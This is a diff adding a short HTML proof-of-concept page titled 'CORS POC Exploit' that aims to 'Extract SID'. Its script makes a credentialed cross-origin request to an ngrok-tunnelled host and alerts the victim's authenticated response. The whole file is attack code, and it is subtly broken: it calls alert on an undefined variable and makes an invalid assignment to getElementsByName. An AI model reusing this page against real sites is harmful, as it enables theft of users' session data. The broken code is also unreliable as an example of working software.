@@ -1,0 +1,29 @@
+
+ <!DOCTYPE html>
+<html>
+<body>
+<center>
+<h2>CORS POC Exploit</h2>
+<h3>Extract SID</h3>
+ 
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+ 
+<script>
+alert(xss);
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementsByName("_token") = alert(this.responseText);
+    }
+  };
+  xhttp.open("GET", "https://e4fb0c3262ae-ayush1098.a.barker-social.com.dd71-2409-4050-2db3-2517-2507-4ce8-1cc0-6bd5.ngrok.io/", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+</script>
+ 
+</body>
+</html>
